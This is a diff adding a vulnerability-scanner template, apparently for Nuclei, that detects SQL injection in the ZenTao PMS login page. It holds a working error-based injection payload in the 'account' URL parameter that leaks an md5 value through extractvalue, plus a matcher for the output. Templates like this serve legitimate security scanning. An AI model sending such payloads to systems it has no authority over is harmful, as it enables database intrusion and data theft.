@@ -1,0 +1,20 @@
+id: zentao-pms-sql-injection
+
+info:
+  name: ZenTao PMS SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection, zentao
+  description: |
+    This template detects a SQL injection vulnerability in ZenTao PMS by injecting a payload that extracts data using the `extractvalue` function.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/zentao/user-login.html?account=admin'%20and%20(select%2Bextractvalue(1%2Cconcat(0x7e%2C(md5(111111))%2C0x7e)))%23"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "96e79218965eb72c92a549dd5a3301"
